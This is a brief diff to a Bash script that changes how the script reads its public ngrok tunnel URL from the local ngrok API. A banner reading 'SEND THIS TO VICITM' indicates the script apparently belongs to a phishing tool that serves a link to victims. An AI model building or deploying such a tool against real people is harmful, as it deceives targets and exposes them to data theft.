@@ -80,7 +80,7 @@ echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------
 sleep 25
 clear
 echo ""
-url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+url=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p')
 echo ""
 echo ""
 echo -e "\e[96m======================\e[91m SEND THIS TO VICITM \e[96m========================= \e[93m"
